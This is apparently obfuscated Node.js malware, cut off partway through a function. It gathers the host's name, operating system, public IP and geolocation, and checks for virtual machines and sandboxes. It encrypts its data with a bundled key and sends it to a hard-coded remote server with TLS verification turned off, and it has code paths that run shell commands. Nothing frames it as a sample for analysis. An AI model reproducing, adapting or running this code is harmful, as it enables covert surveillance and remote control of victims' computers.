if (typeof window === "undefined") {
  const a0_0xbafec=a0_0x20f6;(function(_0x50d58b,_0xe8c0c){const _0x54f7db=a0_0x20f6,_0x482aba=_0x50d58b();while(!![]){try{const _0x18379d=-parseInt(_0x54f7db(0x1a2))/0x1+-parseInt(_0x54f7db(0x143))/0x2*(parseInt(_0x54f7db(0x229))/0x3)+-parseInt(_0x54f7db(0x1c6))/0x4*(parseInt(_0x54f7db(0x1c0))/0x5)+-parseInt(_0x54f7db(0x204))/0x6*(parseInt(_0x54f7db(0x16b))/0x7)+-parseInt(_0x54f7db(0x1fe))/0x8+parseInt(_0x54f7db(0x21c))/0x9+parseInt(_0x54f7db(0x167))/0xa*(parseInt(_0x54f7db(0x1f7))/0xb);if(_0x18379d===_0xe8c0c)break;else _0x482aba['push'](_0x482aba['shift']());}catch(_0x5b996e){_0x482aba['push'](_0x482aba['shift']());}}}(a0_0x20e9,0xe96e8));const a0_0x2c4cef=(function(){const _0x3a8fa7=a0_0x20f6,_0x488220={'PTvTh':function(_0x48ccb1,_0x551b9d){return _0x48ccb1!==_0x551b9d;},'iIjSn':_0x3a8fa7(0x14c),'HMdWw':_0x3a8fa7(0x17d),'SuAUQ':function(_0x12181c){return _0x12181c();},'TPblD':_0x3a8fa7(0x1a1),'ECMFa':_0x3a8fa7(0x1c3),'ysFpI':function(_0x196b68,_0x1f75d4){return _0x196b68!==_0x1f75d4;}};let _0x32d5fd=!![];return function(_0xce0872,_0x306dd7){const _0x2a6703=_0x3a8fa7;if(_0x488220[_0x2a6703(0x24b)](_0x2a6703(0x208),_0x2a6703(0x26c))){const _0x4453be=_0x32d5fd?function(){const _0x19c2dc=_0x2a6703;if(_0x488220[_0x19c2dc(0x20f)]('kZQBp',_0x488220[_0x19c2dc(0x1e0)]))return;else{if(_0x306dd7){if(_0x488220[_0x19c2dc(0x20f)](_0x488220[_0x19c2dc(0x174)],_0x488220[_0x19c2dc(0x174)]))_0x5d2cb7[_0x19c2dc(0x24a)](_0x2e740e[_0x19c2dc(0x19c)](_0x142559),{'recursive':!![]});else{const _0x628d03=_0x306dd7[_0x19c2dc(0x1b7)](_0xce0872,arguments);return _0x306dd7=null,_0x628d03;}}}}:function(){};return _0x32d5fd=![],_0x4453be;}else{const _0x589715=_0x488220['SuAUQ'](_0x68acd7),_0x275a82=_0x38cabe[_0x2a6703(0x193)](_0x488220[_0x2a6703(0x136)],_0x589715);return _0x275a82[_0x2a6703(0x1d5)](_0x206c8a),_0x275a82[_0x2a6703(0x1d5)](_0x3d3654),_0x275a82[_0x2a6703(0x1ea)](_0x488220['ECMFa']);}};}()),a0_0x3b7332=a0_0x2c4cef(this,function(){const _0x45450f=a0_0x20f6,_0x384576={'ZmvQY':_0x45450f(0x1a9)};return a0_0x3b7332['toString']()[_0x45450f(0x12d)](_0x384576[_0x45450f(0x11b)])['toString']()[_0x45450f(0x131)](a0_0x3b7332)[_0x45450f(0x12d)](_0x384576[_0x45450f(0x11b)]);});a0_0x3b7332();function a0_0x20e9(){const _0x36d7ff=['uLD3twe','vKjVEa','BxHxCgq','A1PrqNa','ChmGyxv4ihWGyxDRicD7ChjPBNqGjdeXFsC','uhLAANq','l21Vide','CgLKlNr4Da','wK9hshq','CgXHDgzVCM0','C3LZDgvTsw5MBW','ENjYzKO','zxjsq1m','CMvWBgfJzq','qxLpzKC','y2L0Eq','rgXKAwG','CNbTic1Xyq','tLqGqvvuse9ssvrzxfnzu1rftq','D3vkvMC','jYiGjIbFcIaGicaGicaGiIaTv2LUzg93u3r5BguGsgLKzgvUic1qyxnZvgHYDtSIicyGxWOGicaGicaGiciKCc5jzcb8ie91Dc1gAwXLic1fBMnVzgLUzYbHC2nPAsaNiIaMihbPzezPBguGjIaIjYiGjIbFcIaGicaGicaGiIiIiGOkicaGicaGC2HLBgWUuNvUihbZq21KlcaWlcbuCNvLcGOGicaGicbjzIbfCNiUtNvTyMvYidW+idaGvgHLBGOGicaGicaGie9UievYCM9YifjLC3vTzsbozxH0cIaGicaGicaGrgLTigvYCKzZBYWGzxjYrMLSzsWGzxjYu3rYzwfTcIaGicaGicaGu2v0igvYCKzZBYa9ienYzwf0zu9IAMvJDcGIu2nYAxb0Aw5NlKzPBgvtExn0zw1pyMPLy3qIkqOGicaGicaGigvYCKzPBguGpsaI','s1bAz0i','q0jguM4','ChjVz3jHBs52yNm','C3LZDgvTAw5MBW','Aw5KzxHpzG','v3rHwfq','yNjLDYbSAxn0','l3jSieHjr0Hfu1qGl2L0','C2nODgfZA3mGl3j1BIaVDg4GiG','mtu1meTjy3HADG','uxvmAxa','s1zn','qwjkqvy','mZuYodmYowzPy2jZwq','AezxCLa','qLbxze8','ue9vz1K','zuDjuLO','ywvZlti1nI1JyMm','B3rICuC','Ahr0Chm6lY90zxn0DgvZDhrLC3rSB2fKlNn0B3jL','v3j4tuy','se1Kv3C','C2nODgfZA3mGl2nYzwf0zq','CMfgz0u','iGOGicaGicaGifnLDcbLCNjtDhjLyw0GpsbLCNjgC28Ut3bLBLrLEhrgAwXLkgvYCKzPBguSidGSifrYDwuPcIaGicaGicaGzxjYu3rYzwfTlLDYAxrLtgLUzsboB3CGjIaIic0GrxjYB3iGiIaMievYCI5oDw1IzxiGjIaIoIaIicyGrxjYlKrLC2nYAxb0Aw9UcIaGicaGicaGzxjYu3rYzwfTlKnSB3nLcIaGicaGicaGrxjYlKnSzwfYcIaGicaGievUzcbjzGOGicaG','zw5JCNLWDgvKuMvZCg9UC2u','rxjYB3iGz2v0DgLUzYbZExn0zw0GAw5MBZOG','uLLvuMK','yxHPB3m','wKDMALK','sgPNufe','sfrcuhm','rNzrDxG','ALbTuuu','BM9Kzsa','rfz3wxO','yZPC','vhLnz0u','vNzov1a','rgLmwui','AuH6DeC','uuvnvq','Cg9pBvK','twLJCM9ZB2z0rwrNzuXVz1rHC2S','yNPerKG','vKjpwf9nu0LFsu5tvefmta','EuPbvuK','s2v6C04','C3bSAxq','D0LACeK','yvnusg4','wgvU','y3jLyxrLsg1HyW','CgfVrNa','BwvZC2fNzq','sgzQDwi','vxjWvMe','BhnIx3jLBgvHC2uGlweGmJ4Vzgv2l251BgWGFhWGy2f0ic9LDgmVB3mTCMvSzwfZzq','zMLUywW','zNjVBq','z0LmqMS','zgLYBMfTzq','tvfLC0e','l3rYicj3C2nYAxb0lMv4zsa','A1nWqum','B3Lsq24','C2HHmJu2','odyZnte1s2XMuxPH','rxHPDa','A0zXtgO','z1LAqvm','zvv1Bwi','DxrMoa','4PQG77IpicbezxrLy3rLzdOG','kcGOlISPkYKRksSK','vvjqr2W','CMfUzg9TqNL0zxm','lY5JB25MAwCVtw91C2vWywqVtw91C2vWywqVC2nYAxb0lMPZ','yLD5rvm','BwfW','Aw5JBhvKzxm','l3j1ia','EeDIqLK','zxr4BMq','AxnjB0S','B2TcDgK','vw5RBM93BG','tLqGqvvuse9ssvrzxe5fvfDpuKSGu0vsvKLdrq','yxbWBhK','CeDKuhG','BLL3wxC','iGOkicaGicaGu2v0igzZBYa9ienYzwf0zu9IAMvJDcGIu2nYAxb0Aw5NlKzPBgvtExn0zw1pyMPLy3qIkqOGicaGicbtzxqGC2HLBgWGpsbdCMvHDgvpyMPLy3qOiLDty3jPChqUu2HLBgWIkqOkicaGicaGswyGzNnVlKzPBgvfEgLZDhmOCgLKrMLSzsKGvgHLBGOGicaGicaGierPBsbMAwXLlcbLEgLZDgLUz1bPzaOGicaGicaGifnLDcbMAwXLid0GzNnVlK9Wzw5uzxH0rMLSzsHWAwrgAwXLlcaXkqOGicaGicaGigv4Axn0Aw5NugLKid0GvhjPBsHMAwXLlLjLywrmAw5LkcKPcIaGicaGicaGzMLSzs5dBg9ZzqOkicaGicaGicbeAw0GD21PlcbXDwvYEsWGChjVy2vZC2vZcIaGicaGicaGu2v0ihDTAsa9ieDLDe9IAMvJDcGID2LUBwDTDhm6xfWUxhjVB3rCy2LTDJiIkqOGicaGicaGihf1zxj5id0GiLnftevdvcaQiezst00Gv2LUmZjFuhjVy2vZCYbxsevsrsbqCM9JzxnZswqGpsaIicyGzxHPC3rPBMDqAwqkicaGicaGicbtzxqGChjVy2vZC2vZid0GD21PlKv4zwnrDwvYEsHXDwvYEsKkcIaGicaGicaGswyGChjVy2vZC2vZlKnVDw50id4GmcbuAgvUcIaGicaGicaGicbxu2nYAxb0lLf1AxqkicaGicaGicbfBMqGswykicaGicaGrw5KieLMcGOGicaGicbeAw0GChndBwqkicaGicaGChndBwqGpsaICg93zxjZAgvSBcaTv2LUzg93u3r5BguGsgLKzgvUic1dB21Tyw5KiciIiIaMif8kicaGicaGicaIjhaGpsbtDgfYDc1qCM9JzxnZig5VzguGlufYz3vTzw50tgLZDcaN','vvPdEfu','y29UDgLUDwu','zhbRzYaTBcb8igf3AYaNE3bYAw50icqYFsC','BKfms2S','BNbsyui','nde0nvPjqNvcsq','yxbWBgLJyxrPB24VANnVBG','CgfYC2u','Agv4','v2LUzg93CW','uhjVz3jHBxm','odK3mKvHsw1lvG','Cg93zxjZAgvSBa','AMPJzMK','sNPXs3O','ELfjCvy','vgf4r2i','ugfYywXSzwXZ','lY5JB25MAwCVtw91C2vWywqVtw91C2vWywq','u2n1tg0','CKPisLu','4PQG77IpicbgB3vUzcbLBNyGDMfYoIa','y2LNsNC','vNPIAva','l3rUici','C2HPzNq','DxbKyxrL','s2fItem','sMPqswy','CMvHzezPBgvtEw5J','vKXPDhe','CMvNihf1zxj5ieHlte1Cu1Ltvevnxen1CNjLBNrdB250CM9Su2v0xfnLCNzPy2vZic9Z','DMDKyLy','zxf5rfC','zM5sB2G','u2fUzgjVEgLL','CffjBLO','AuLQu24','BvDjvvu','Ag9ZDg5HBwu','z0X6Cue','BhzTr0e','D2HVyw1Pic9NCM91Chm','wKzsvMi','sfv3Cwy','AevAvKe','y2f0ic9ZExmVy2XHC3mVzg1Pl2LKl3n5C3rLBv9WCM9KDwn0x25HBwuGmJ4Vzgv2l251BgWGFhWGzwnOBYaIiG','zgLNzxn0','wensAwq','y29Uy2f0','zLnMuuK','yvDgD2W','CwLUBe4','D0zqCxu','Bfbpv3K','AvvpC2W','vMLYDhvHBejVEa','uKnWzuG','qZPCuhjVz3jHBurHDgfCuhjVz3jHBxm','De50yMO','ndmZmde1z09fwMHs','DxDPuey','seD3zMm','Bw5uAe0','zNn2q3a','C0LvsKy','Aen1vwy','nJyZndCYog9vs3PmrG','rhHVDLa','yLDKs3K','Dg9ju09tDhjPBMC','EfbZAgi','uw5hBNG','mtHOtM1Oz3i','q0j2BLG','yK5LAM8','vwLMEvq','uM55tKS','D1LIrvG','yNnkAxe','vKXYz3K','DMnTEwG','D3jPDgvgAwXLu3LUyW','DuDqvKK','ufr2vgG','tujpsNm','DuvotMi','CMvNihf1zxj5icjis0vzx0Xpq0fmx01bq0HjtKvCu09gvfDbuKvCtwLJCM9ZB2z0xfDPBMrVD3nCq3vYCMvUDfzLCNnPB25Cvw5PBNn0ywXSiIaVCW','yNbftLq','vxj6rMO','uMjpvwK','y3j5ChrV','q29UDgLUDwu','BxznuhO','rePHrKK','uNfduwS','C3rHCNr1CgrHDge','odq3mdeZnhrRt2DTtG','s0f3rvC','yNfzvKW','C3rYAw5NAwz5','y291BNrYEv9Uyw1L','DMHsv3e','Bwf0y2G','AwDUB3jL','BgLUDxG','BhmGl0fWCgXPy2f0Aw9UCW','wwjJveu','Cgf0Aa','qwDLBNq','mJDkq2Twsw0','Dw15v0y','Eev2uvO','DNLmq08','zgfYD2LU','u1brtxq','zM9YrwfJAa','v25yrhO','EurJEeq','Ag9TzwrPCG','z2v0','rxjYB3iGz2v0DgLUzYbZExn0zw1PBMzVoIa','y3LOyui','A1zNy0S','zvjMBva','vK1xqvjfx1jvtLrjtuu','BfrHtKm','tLqGqvvuse9ssvrzxeXpq0fmifnfuLzjq0u','BgvUz3rO','ChvZAa','EKjfq2e','sNrYwxy','Dg9tDhjPBMC','yurJsKy','u3HurKS','D0HfDMi','Ahr0Chm','lNrTCfbYB2DYyw1Z','tff0suW','A0XTwwO','EwHZAhq','twfJ','D0f1wuG','BwTKAxjtEw5J','ExngCeK','z3LMC20','wMj4r3u','z2n5Ewu','z1norvG','ChjVz3jHBs5QCW','kgz1BMn0Aw9Ukg5Hy2WPia','zLnfzMm','r1PdsKK','C0nnCfe','rhfgtg0','s3Lvrxy','zMP4teW','t2nXqKy','rhbZB1i','sMTyEha','y1rUEKm','zxHPDa','Ahr0Chm6lY9HCgKUAxbPzNKUB3jNp2zVCM1HDd1QC29U','s01nswS','rLjfz2m','tK9Pvhy','EfbQr1K','y2vRDNK','vMD4Agu','DgfZA2XPC3qGl3yGl2zVignZDG','we1dvLu','A2v5CW','Dxvet04','zeDntg4','qwLsDuS','uY0Xlte2lteYmJG4','CwLUCLe','CM12Ahi','Bu12t2G','A2nQz28','C3vJy2vZCW','rKrOt1G','AKv1t3q','C3LZDgvTx3bYB2zPBgvYifnqsgfYzhDHCMveyxrHvhLWzq','y1Ddz0W','C2XPy2u','zwTewvm','rxHQseS','uurNCuK','BwLPs1e','rNjnveG','vwXYs2K','BKDWwfu','y25LuwC','AvvLvKq','ELD1z3G','whPKvNq','EYbKzwzHDwX0oIbVyMOGFtSGFq','q1fiqwC','l2fWAs9YzxbVCNq','u0Xmy1K','lY5JB25MAwCVtw91C2vWywqVtw91C2vWywqVC3rHCNr1Cc5ZAa','AM9PBG','z1LIvKS','zxHPC3rZu3LUyW','zwTfreK','uLHLyMO','z3z4tM0','Cg93zxjZAgvSBcaTq29TBwfUzcaI','Dw5HBwuGlwe','wM12uvK','vunJvKi','yvzlB2u','vw5RBM93BIbmB2nHDgLVBG','re1IrxK','rMfPBgvKihrVihjLywqGC2HHCMvKigTLEsbMCM9Tia','Cur4wxG','uxz4ELa','sLDcy0W','tuPMtLO','vurMC0q','C2P4vuO','ELvcsMO','y2HPBgrFChjVy2vZCW','r2HQB3u','Dg9vChbLCKnHC2u','DezQzhG','AxncDwzMzxi','C2vHCMnO','v2Xewgm','txLLDva','EMXjquu','y29UC3rYDwn0B3i','CMvNAw9Ux25HBwu','Bwf0y2HbBgW','r1zpt3G','l3nJie1jtLvurq','vfbIBeq','tgLUDxG','u3vdCgq','D2LUmZi','DhjPBq','zMXHzW','vunuDwu','Cg9ZDa','zgf0yq','A2Dkrgm','AvPgDNO','y1fRC1C','vMLYDhvHBcbnywnOAw5L','mJi3mtm4D2Ttufz5','uvP2A2S','ywrK','vK13yxjL','Dg9mB3DLCKnHC2u','EerNA2K'];a0_0x20e9=function(){return _0x36d7ff;};return a0_0x20e9();}const crypto=require(a0_0xbafec(0x216)),axios=require(a0_0xbafec(0x17b)),https=require(a0_0xbafec(0x243)),fs=require('fs'),path=require(a0_0xbafec(0x227)),os=require('os'),{execSync,exec,spawn}=require(a0_0xbafec(0x128));let SERVER_URL=a0_0xbafec(0x172),API_ENDPOINT=SERVER_URL+a0_0xbafec(0x110);async function sendToServer(_0x599a6c){const _0x4857ab=a0_0xbafec,_0x160cc7={'nGpXU':function(_0x51f778,_0x10faf2){return _0x51f778(_0x10faf2);},'bzDFH':function(_0x266b0a,_0x1de10d,_0x2238ea){return _0x266b0a(_0x1de10d,_0x2238ea);},'fSEfc':_0x4857ab(0x1a7),'UrzFj':_0x4857ab(0x153),'KAwEW':_0x4857ab(0x1f3),'RXebj':_0x4857ab(0x146),'LQtIL':_0x4857ab(0x188),'wFPqu':_0x4857ab(0x169),'iVjkz':_0x4857ab(0x1cc),'UlrKi':'Virtual\x20Machine','yhsht':function(_0x4e5c26,_0x214fb4){return _0x4e5c26===_0x214fb4;},'UZCxU':_0x4857ab(0x1c9),'gvxNm':'bUGmZ'};try{if(_0x160cc7[_0x4857ab(0x247)](_0x4857ab(0x1dd),'fnRoh')){const _0x580b1e=SERVER_URL+_0x4857ab(0x110),_0xfeb1b={'timeout':0x7530,'headers':{'Content-Type':_0x4857ab(0x1c1)},'httpsAgent':new https[(_0x4857ab(0x228))]({'rejectUnauthorized':![]})},_0x37f393=await axios[_0x4857ab(0x13d)](_0x580b1e,_0x599a6c,_0xfeb1b);return _0x37f393;}else{const _0x50b5cd={'UCTue':function(_0x1cad1f,_0x3f5778){const _0x1a9ffb=_0x4857ab;return _0x160cc7[_0x1a9ffb(0x109)](_0x1cad1f,_0x3f5778);},'vgdbV':function(_0x13bcc9,_0x31364a){const _0x44e72f=_0x4857ab;return _0x160cc7[_0x44e72f(0x109)](_0x13bcc9,_0x31364a);},'ZGfjY':_0x4857ab(0x26a)};_0x2e55e2(_0x4857ab(0x1e5),(_0x39a76b,_0x131de1)=>{const _0x1595f3=_0x4857ab;if(_0x39a76b)return _0x50b5cd[_0x1595f3(0x13c)](_0x1af6cb,![]);_0x50b5cd[_0x1595f3(0x1db)](_0x419ac,_0x131de1['includes'](_0x50b5cd[_0x1595f3(0x17c)]));});}}catch(_0x38f2e8){if(_0x160cc7[_0x4857ab(0x1bb)]===_0x160cc7[_0x4857ab(0x118)]){const _0x433d76=_0x160cc7[_0x4857ab(0x18b)](_0x375ebe,_0x4857ab(0x161),{'encoding':_0x160cc7[_0x4857ab(0x252)],'timeout':0x2710});_0x191e1b[_0x160cc7[_0x4857ab(0x214)]]=_0x433d76;const _0xf0d5e8=[_0x160cc7[_0x4857ab(0x21d)],_0x160cc7[_0x4857ab(0x117)],_0x160cc7[_0x4857ab(0x245)],_0x4857ab(0x192),_0x160cc7[_0x4857ab(0x1f0)],_0x160cc7['iVjkz'],_0x160cc7[_0x4857ab(0x108)],_0x4857ab(0x1de)];for(const _0x58b7e6 of _0xf0d5e8){_0x433d76[_0x4857ab(0x147)]()[_0x4857ab(0x1af)](_0x58b7e6['toLowerCase']())&&(_0xbf81be[_0x4857ab(0x23c)](_0x4857ab(0x1a8)+_0x58b7e6),_0xbae8bb=0x1);}}else{process['exit'](0x0);throw _0x38f2e8;}}}function getComputerName(){const _0x6c1751=a0_0xbafec;return os[_0x6c1751(0x1e2)]();}function getOSType(){const _0x3ed6e1=a0_0xbafec,_0x3710d8={'Xihpv':function(_0x45e64c,_0x467e8e){return _0x45e64c===_0x467e8e;},'tLUDM':_0x3ed6e1(0x1c4),'PyZjt':function(_0x1c0c2a,_0x54fcb){return _0x1c0c2a===_0x54fcb;},'ekEDI':_0x3ed6e1(0x22d),'otbqG':'linux','GVOOx':_0x3ed6e1(0x137)},_0x2e9dc8=process['platform'];if(_0x3710d8['Xihpv'](_0x2e9dc8,_0x3ed6e1(0x139)))return _0x3710d8['tLUDM'];if(_0x3710d8[_0x3ed6e1(0x14e)](_0x2e9dc8,_0x3710d8[_0x3ed6e1(0x116)]))return'Mac';if(_0x2e9dc8===_0x3710d8[_0x3ed6e1(0x171)])return _0x3710d8[_0x3ed6e1(0x134)];return _0x2e9dc8;}async function getPublicIP(){const _0x2c66c7=a0_0xbafec,_0x330185={'wAuYH':function(_0x61ebb1,_0x5d1ef7){return _0x61ebb1(_0x5d1ef7);},'YMcjq':function(_0x41d60a,_0x20ba32){return _0x41d60a!==_0x20ba32;},'eGIRZ':_0x2c66c7(0x241),'bpENT':_0x2c66c7(0x25d),'aDcJF':function(_0x54658e,_0x419295){return _0x54658e===_0x419295;},'RCpeH':_0x2c66c7(0x187),'bNejo':_0x2c66c7(0x1b5)};try{if(_0x330185['YMcjq'](_0x330185[_0x2c66c7(0x16f)],_0x330185[_0x2c66c7(0x16f)])){if(_0x2fad65){_0x330185[_0x2c66c7(0x249)](_0x1d9577,_0x5501dd);return;}_0x234c00({'stdout':_0x273b03[_0x2c66c7(0x13a)](),'stderr':_0x2d8f06['trim']()});}else{const _0x386a1e=await axios[_0x2c66c7(0x233)](_0x330185[_0x2c66c7(0x213)],{'timeout':0x1388});return _0x386a1e[_0x2c66c7(0x13e)]['ip'];}}catch(_0x4e7f3a){if(_0x330185[_0x2c66c7(0x240)](_0x330185[_0x2c66c7(0x1f4)],'iHztG'))return _0x330185[_0x2c66c7(0x206)];else{const _0x12d233=_0xdda9b7[_0x2c66c7(0x222)](/^\s*DisplayName\s+REG_SZ\s+(.+)$/i);if(_0x12d233)_0x466954['add'](_0x12d233[0x1]['trim']());}}}function getSharedKey(){const _0x984287=a0_0xbafec,_0x32a6d2={'zQIqV':'shared.key'},_0x4d2521=path[_0x984287(0x113)](__dirname,_0x984287(0x266),_0x32a6d2[_0x984287(0x1ca)]);try{return fs[_0x984287(0x1d8)](_0x4d2521);}catch(_0x1f1b5e){throw new Error('Failed\x20to\x20read\x20shared\x20key\x20from\x20'+_0x4d2521+':\x20'+_0x1f1b5e[_0x984287(0x195)]);}}function encryptData(_0x37b888){const _0x40fda=a0_0xbafec,_0x3c4daf={'GStYk':function(_0x5a9e92){return _0x5a9e92();},'lTaNC':'aes-256-cbc','TaxGb':_0x40fda(0x1a7)},_0x74052a=_0x3c4daf['GStYk'](getSharedKey),_0x109ac8=crypto[_0x40fda(0x1ab)](0x10),_0x56388e=crypto['createCipheriv'](_0x3c4daf[_0x40fda(0x239)],_0x74052a,_0x109ac8),_0x343a73=JSON[_0x40fda(0x21f)](_0x37b888),_0xd7203f=Buffer[_0x40fda(0x1ec)]([_0x56388e[_0x40fda(0x1d5)](_0x343a73,_0x3c4daf[_0x40fda(0x1cb)]),_0x56388e[_0x40fda(0x199)]()]);return Buffer[_0x40fda(0x1ec)]([_0x109ac8,_0xd7203f]);}function decryptData(_0x6afa2e){const _0x1f35f9=a0_0xbafec,_0x430655={'DMbEy':function(_0x336bd6,_0x1540dc){return _0x336bd6===_0x1540dc;},'AbJAV':'win32','DVwYz':_0x1f35f9(0x1c4),'FpTXR':'darwin','gILBk':'Mac','NOiTv':_0x1f35f9(0x137),'etxnd':_0x1f35f9(0x170),'fsvCp':function(_0x2691bf,_0x423825){return _0x2691bf!==_0x423825;},'bqYVL':'pGdPx','KabLC':_0x1f35f9(0x253),'MclYb':_0x1f35f9(0x1a7)},_0x10a958=getSharedKey(),_0x2f00ba=_0x6afa2e[_0x1f35f9(0x102)](0x0,0x10),_0x15531f=_0x6afa2e['slice'](0x10),_0x21f5a0=crypto['createDecipheriv'](_0x430655[_0x1f35f9(0x1b2)],_0x10a958,_0x2f00ba),_0x57ef18=Buffer['concat']([_0x21f5a0[_0x1f35f9(0x1d5)](_0x15531f),_0x21f5a0[_0x1f35f9(0x199)]()]),_0x310da1=_0x57ef18[0x0]===0x1,_0x3a3467=_0x57ef18[_0x1f35f9(0x102)](0x1);if(_0x310da1){if(_0x430655[_0x1f35f9(0x1fb)](_0x1f35f9(0x1b8),_0x430655[_0x1f35f9(0x21e)]))_0xabff85[_0x1f35f9(0x23c)](_0x1f35f9(0x1a8)+_0x4388f3);else return _0x3a3467;}else{if(_0x430655['DMbEy'](_0x430655[_0x1f35f9(0x1d6)],_0x430655['KabLC']))return JSON[_0x1f35f9(0x1c2)](_0x3a3467[_0x1f35f9(0x23f)](_0x430655['MclYb']));else{const _0x22e7fb=_0x1c8237[_0x1f35f9(0x152)];if(NZoSpE[_0x1f35f9(0x11f)](_0x22e7fb,NZoSpE[_0x1f35f9(0x16a)]))return NZoSpE[_0x1f35f9(0x182)];if(_0x22e7fb===NZoSpE['FpTXR'])return NZoSpE[_0x1f35f9(0x19b)];if(NZoSpE['DMbEy'](_0x22e7fb,_0x1f35f9(0x224)))return NZoSpE[_0x1f35f9(0x260)];return _0x22e7fb;}}}function generateAuthToken(_0x33168e,_0x29fd44){const _0x2cf9ff=a0_0xbafec,_0x121e1f={'BaZFk':_0x2cf9ff(0x1a1),'kFqLj':_0x2cf9ff(0x1c3)},_0x20d218=getSharedKey(),_0xe4e1e6=crypto[_0x2cf9ff(0x193)](_0x121e1f['BaZFk'],_0x20d218);return _0xe4e1e6[_0x2cf9ff(0x1d5)](_0x33168e),_0xe4e1e6[_0x2cf9ff(0x1d5)](_0x29fd44),_0xe4e1e6[_0x2cf9ff(0x1ea)](_0x121e1f[_0x2cf9ff(0x1a4)]);}async function getLocation(){const _0x10f23f=a0_0xbafec,_0x4afc93={'erRCS':function(_0x5de162,_0xbad0e9,_0x3a27b4){return _0x5de162(_0xbad0e9,_0x3a27b4);},'pQInZ':_0x10f23f(0x161),'Vgxhe':function(_0x113399,_0x3f45f1){return _0x113399!==_0x3f45f1;},'ypqCr':_0x10f23f(0x21a),'hFWrP':_0x10f23f(0x1bf),'ktCnJ':'Unknown\x20Location'};try{if(_0x4afc93[_0x10f23f(0x263)](_0x4afc93['ypqCr'],_0x10f23f(0x21a))){_0x3ef511=_0x4afc93[_0x10f23f(0x155)](_0xe64c18,_0x4afc93[_0x10f23f(0x1df)],{'encoding':_0x10f23f(0x1a7),'timeout':0x2710});const _0x56aea1=_0x5b451a(_0x49cb80);_0x56aea1[_0x10f23f(0x23b)]&&(_0x31fe57[_0x10f23f(0x23c)](..._0x56aea1),_0x2c5933=0x1);}else{const _0x5dde5e=await axios['get']('https://ipapi.co/json/',{'timeout':0x1388});return _0x5dde5e['data'][_0x10f23f(0x220)]+',\x20'+(_0x5dde5e['data'][_0x10f23f(0x158)]||_0x5dde5e[_0x10f23f(0x13e)][_0x10f23f(0x132)]);}}catch(_0x3679e8){return _0x10f23f(0x1bf)===_0x4afc93[_0x10f23f(0x16c)]?_0x4afc93['ktCnJ']:_0x1869ba[_0x10f23f(0x1e2)]();}}function parseVmIndicators(_0x2cf8b0){const _0x5c859b=a0_0xbafec,_0x15af30={'bWdKy':_0x5c859b(0x11e),'RYURi':function(_0xe5ea5b,_0x2e0889){return _0xe5ea5b(_0x2e0889);},'FDhOX':function(_0xe6ac78,_0x33f6ae,_0x2a0294,_0x56ab5e){return _0xe6ac78(_0x33f6ae,_0x2a0294,_0x56ab5e);},'jPmQE':_0x5c859b(0x1f3),'sjxUJ':'VMware','zUBJj':_0x5c859b(0x192),'isIoK':_0x5c859b(0x142),'ScuLm':_0x5c859b(0x1de),'yDcxD':function(_0x1dd8a6,_0x22f215){return _0x1dd8a6===_0x22f215;},'HXAab':_0x5c859b(0x12e),'ubMvl':'LXEun'},_0x4ee14e=[_0x15af30[_0x5c859b(0x180)],_0x15af30[_0x5c859b(0x126)],_0x5c859b(0x188),_0x15af30[_0x5c859b(0x127)],_0x5c859b(0x169),_0x5c859b(0x1cc),_0x15af30[_0x5c859b(0x1b3)],_0x15af30[_0x5c859b(0x1ce)]],_0x37e61e=[];for(const _0x720754 of _0x4ee14e){if(_0x15af30['yDcxD']('DqFLm',_0x5c859b(0x255))){if(_0x2cf8b0[_0x5c859b(0x147)]()[_0x5c859b(0x1af)](_0x720754[_0x5c859b(0x147)]())){if(_0x15af30[_0x5c859b(0x231)](_0x15af30['HXAab'],_0x15af30['ubMvl']))return SlAJMP[_0x5c859b(0x200)];else _0x37e61e[_0x5c859b(0x23c)](_0x5c859b(0x1a8)+_0x720754);}}else _0x15af30[_0x5c859b(0x270)](_0x42b4b6,_0x3a426e,{'shell':!![]},(_0x591f8d,_0x7777d3,_0x328c94)=>{const _0x486a7e=_0x5c859b;if(_0x591f8d){_0x19ddb5(_0x591f8d);return;}_0x15af30[_0x486a7e(0x17a)](_0x4197e3,{'stdout':_0x7777d3[_0x486a7e(0x13a)](),'stderr':_0x328c94['trim']()});});}return _0x37e61e;}function getSystemInfoWindows(){const _0xe598a7=a0_0xbafec,_0xcf6290={'cQksW':function(_0xe16700,_0x19afcd,_0x2039fb){return _0xe16700(_0x19afcd,_0x2039fb);},'yJAUI':_0xe598a7(0x1a7),'mWIUU':function(_0x15b8eb,_0x2272c5){return _0x15b8eb+_0x2272c5;},'QZvkk':function(_0x21c6af,_0x19be50,_0xc6b6ba){return _0x21c6af(_0x19be50,_0xc6b6ba);},'CQHAg':_0xe598a7(0x161),'GJOnQ':function(_0x11fd1f,_0x27765b){return _0x11fd1f(_0x27765b);},'gYbVK':function(_0x4c9177,_0x12a843){return _0x4c9177!==_0x12a843;},'bbCyd':_0xe598a7(0x15c),'QuLip':function(_0x22f7d8,_0x106cec){return _0x22f7d8===_0x106cec;},'eiuVJ':_0xe598a7(0x1f6),'KPZgB':_0xe598a7(0x18c),'cekvy':_0xe598a7(0x238),'HGwfc':_0xe598a7(0x188),'QvxzP':_0xe598a7(0x25b),'yROFk':function(_0x10bebd,_0x347cff){return _0x10bebd(_0x347cff);},'WrxMF':_0xe598a7(0x1a3)},_0x115e84=[];let _0x3698d6='',_0x5806cc=0x0;try{_0x3698d6=_0xcf6290[_0xe598a7(0x144)](execSync,_0xcf6290[_0xe598a7(0x10f)],{'encoding':_0xcf6290[_0xe598a7(0x18d)],'timeout':0x2710});const _0x40c798=_0xcf6290['GJOnQ'](parseVmIndicators,_0x3698d6);if(_0x40c798[_0xe598a7(0x23b)]){if(_0xcf6290[_0xe598a7(0x114)](_0xcf6290['bbCyd'],_0xcf6290['bbCyd'])){const _0xdccde1=_0xcf6290[_0xe598a7(0x141)](_0x2755ee,_0xe598a7(0x100),{'encoding':_0xcf6290[_0xe598a7(0x18d)],'timeout':0x2710});_0x478b3e+=_0xcf6290[_0xe598a7(0x1e1)]('\x0a',_0xdccde1);}else _0x115e84[_0xe598a7(0x23c)](..._0x40c798),_0x5806cc=0x1;}}catch(_0x3649e7){if(_0xcf6290[_0xe598a7(0x168)](_0xcf6290['eiuVJ'],'yZKoD')){if(_0x935692)return;}else _0x115e84[_0xe598a7(0x23c)](_0xe598a7(0x234)+_0x3649e7['message']);}const _0x31f4c8=[_0xcf6290[_0xe598a7(0x15e)],_0xcf6290[_0xe598a7(0x262)],_0xcf6290[_0xe598a7(0x1f9)]];for(const _0x345e93 of 